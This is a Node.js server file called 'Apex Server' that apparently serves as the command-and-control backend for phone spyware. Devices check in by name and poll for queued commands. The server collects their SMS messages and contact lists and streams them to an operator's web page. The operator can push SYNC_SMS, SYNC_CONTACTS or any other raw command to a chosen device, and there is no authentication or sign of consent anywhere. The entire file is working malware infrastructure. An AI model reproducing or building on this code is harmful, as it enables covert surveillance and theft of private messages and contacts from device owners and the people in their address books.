const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const compression = require('compression');
const fs = require('fs'); // Added File System module

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(compression());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Load devices from file if it exists, otherwise start empty
let activeDevices = {};
if (fs.existsSync('devices.json')) {
    try {
        activeDevices = JSON.parse(fs.readFileSync('devices.json', 'utf8'));
        // Reset all statuses to Disconnected on startup (since server rebooted)
        for (let id in activeDevices) activeDevices[id].status = 'Disconnected';
    } catch (e) { console.error("Error loading devices.json"); }
}

let pendingCommands = {};

function saveDevices() {
    fs.writeFileSync('devices.json', JSON.stringify(activeDevices, null, 2));
}

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('/api/connect', (req, res) => {
    const deviceName = req.query.deviceName || 'Unknown';
    activeDevices[deviceName] = { 
        deviceName: deviceName, 
        status: 'Connected', 
        lastSeen: Date.now() 
    };
    saveDevices(); // Save changes
    io.emit('device_status', activeDevices[deviceName]);
    res.status(200).send("OK");
});

app.get('/api/get-command', (req, res) => {
    const deviceName = req.query.deviceName;
    if (!deviceName) return res.status(400).send("Missing");

    if (activeDevices[deviceName]) {
        activeDevices[deviceName].lastSeen = Date.now();
        if (activeDevices[deviceName].status !== 'Connected') {
            activeDevices[deviceName].status = 'Connected';
            saveDevices();
            io.emit('device_status', activeDevices[deviceName]);
        }
    }

    if (pendingCommands[deviceName]) {
        const cmd = pendingCommands[deviceName];
        delete pendingCommands[deviceName];
        return res.status(200).json({ command: cmd });
    }
    res.status(204).send();
});

app.post('/api/sync-data', (req, res) => {
    const { deviceName, dataType, payload } = req.body;
    const eventName = (dataType === 'SMS') ? 'sms_data_received' : 'contacts_data_received';
    io.emit(eventName, { deviceName, logs: payload });
    res.status(200).send("OK");
});

io.on('connection', (socket) => {
    socket.emit('initial_state', activeDevices);
    socket.on('controller_command', (data) => {
        const mapping = { 'sync_sms': 'SYNC_SMS', 'sync_contacts': 'SYNC_CONTACTS' };
        pendingCommands[data.targetDevice] = mapping[data.command] || data.command;
    });
});

setInterval(() => {
    const now = Date.now();
    for (let id in activeDevices) {
        if (now - activeDevices[id].lastSeen > 120000 && activeDevices[id].status === 'Connected') {
            activeDevices[id].status = 'Disconnected';
            saveDevices();
            io.emit('device_status', activeDevices[id]);
        }
    }
}, 30000);

const PORT = 3000;
server.listen(PORT, () => console.log(`Apex Server running on http://localhost:${PORT}`));
